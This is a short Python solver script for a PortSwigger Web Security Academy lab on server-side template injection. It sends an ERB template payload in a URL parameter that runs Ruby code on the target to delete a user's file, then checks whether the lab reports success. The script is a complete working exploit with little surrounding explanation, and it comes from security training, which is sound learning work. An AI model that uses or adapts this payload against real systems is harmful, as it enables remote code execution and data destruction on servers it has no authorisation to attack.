#!/usr/bin/env python3
# Basic server-side template injection
# Lab-Link: https://portswigger.net/web-security/server-side-template-injection/exploiting/lab-server-side-template-injection-basic
# Difficulty: PRACTITIONER
import requests
import sys
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    print('[+] Basic server-side template injection')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        url = f"{host}/?message=<%25+require+'fileutils'%3b+FileUtils.rm+'/home/carlos/morale.txt'+%25>"
        client.get(url)
        
        # I had some times issues getting the proper result, so wait briefly before checking
        time.sleep(2)
        if 'Congratulations, you solved the lab!' not in client.get(f'{host}').text:
            print(f'[-] Failed to solve lab')
            sys.exit(-9)

        print(f'[+] Lab solved')


if __name__ == "__main__":
    main()
